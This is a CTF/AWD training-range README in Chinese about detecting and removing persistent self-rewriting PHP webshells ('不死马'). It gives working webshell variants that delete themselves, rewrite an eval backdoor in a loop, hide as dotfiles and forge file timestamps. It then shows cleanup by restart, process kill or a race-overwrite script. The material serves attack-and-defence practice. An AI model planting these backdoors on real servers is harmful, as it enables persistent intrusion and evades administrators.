```bash
 ____    ______  ____       ___    ______  __      __  ____      
/\  _`\ /\__  _\/\  _`\   /'___`\ /\  _  \/\ \  __/\ \/\  _`\    
\ \ \/\_\/_/\ \/\ \ \L\_\/\_\ /\ \\ \ \L\ \ \ \/\ \ \ \ \ \/\ \  
 \ \ \/_/_ \ \ \ \ \  _\/\/_/// /__\ \  __ \ \ \ \ \ \ \ \ \ \ \ 
  \ \ \L\ \ \ \ \ \ \ \/    // /_\ \\ \ \/\ \ \ \_/ \_\ \ \ \_\ \
   \ \____/  \ \_\ \ \_\   /\______/ \ \_\ \_\ `\___x___/\ \____/
    \/___/    \/_/  \/_/   \/_____/   \/_/\/_/'\/__//__/  \/___/ 
                                                                                                                                
# @Author: 探姬
# @Date:   2024-08-26 14:34
# @Repo:   github.com/ProbiusOfficial/ctf2awd
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - ctf2awd靶场 : 应急响应 - 不死马查杀 --- 
```

## 配置信息

docker - ubuntu:22.04
username: `helloctf`
password: `123456`

开启题目后会得到 `IP:PORT` 信息，这里将不再能使用浏览器直接打开，你需要使用 `ssh` 连接到 GameBox 上:

```bash
ssh username@ip -p port
```

内部端口在无特殊声明的情况下均为 22 端口，由于存在 MySQL 环境，最低内存请给256，建议512。

## 关于本关卡

PHP"不死马"指的是一种即使被删除了文件，进程仍然继续运行的木马程序。

它通过不断在内存中创建新的木马文件，使得管理员很难彻底清除它。虽然名称中有"不死"一词，但这种木马并没有实现真正的无文件攻击或内存中的webshell攻击，因此严格来说，它并不属于"内存马"的范畴。

最常规的不死马：

```php
<?php
set_time_limit(0); # 设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。
ignore_user_abort(1); # 函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开。
unlink(__FILE__); # 删除自身
while (1) {
$content = '<?php @eval($_POST["cmd"]); ?>';
file_put_contents("shell.php", $content);
usleep(10000); # usleep函数：延迟执行当前脚本若干微秒,1秒 = 1000000 微秒
}
?>
```

在最常规不死马的基础上进行各类扩展：

如，将 `$content` 内容改为 `<?php if(md5($_POST["passwd"])=="MD5(YOUR_PASS)"){@eval($_REQUEST["cmd"]);} ?>`，可有效防止蹭车，被他人连接木马的情况。
或者，在其中加入文件时间的修改，或者创建文件为 `.xxx.php` 的隐藏文件形式，用于迷惑对方选手。

```php
<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_POST["passwd"])=="MD5(YOUR_PASS)"){@eval($_REQUEST["cmd"]);} ?>';
while (1){
	file_put_contents($file,$code);
	system('touch -m -d "2017-11-12 10:10:10" .index.php');
	usleep(50000);
}
?>
```

亦或者，写入多个文件，并且赋予合理名字，用于混淆对方选手。

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.login.php';
$file1 = '/admin/.register.php'; 
$code = '<?php if(md5($_POST["passwd"])=="MD5(YOUR_PASS)"){@eval($_REQUEST["cmd"]);} ?>';

while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2020-12-01 18:10:12" .login.php');
    file_put_contents($file1,$code);
    system('touch -m -d "2020-12-01 18:10:12" /admin/.register.php');
    usleep(5000);
}
?>

```

删除这些脚本文件并不能解决问题，因为PHP在执行时已经将它们读入并解释成opcode运行。

通常情况下，清除不死马的方法有以下几种：

- 重启服务器 / php服务

- 强行kill后台进程 `ps aux|grep www-data|awk '{print 2}'| xargs kill -9`

- 使用竞争覆盖删除

但由于大多数AWD环境使用Docker容器，并且权限限制较多，前两种方法通常不起作用，因此竞争覆盖删除成为最可靠的解决方案。

使用低Sleep方式竞争写入同名文件，覆盖不死马:

```php
<?php
set_time_limit(0); 
ignore_user_abort(1);
unlink(__FILE__); 
while (1) {
$content = 'Noting';
file_put_contents("shell.php", $content);
usleep(1000); 
}
?>
```
使用bash命令一键执行：

```bash
echo "<?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while (1) { file_put_contents('shell.php', 'Noting'); usleep(10); } ?>" > /var/www/html/kill.php && timeout 5 curl http://127.0.0.1/kill.php
```
## 其他

笔者在编写该关卡时，看到了另一种 PHP内存马的实现，感兴趣的师傅可以看看：[【利用 PHP-FPM 做内存马的方法】](https://tttang.com/archive/1720/)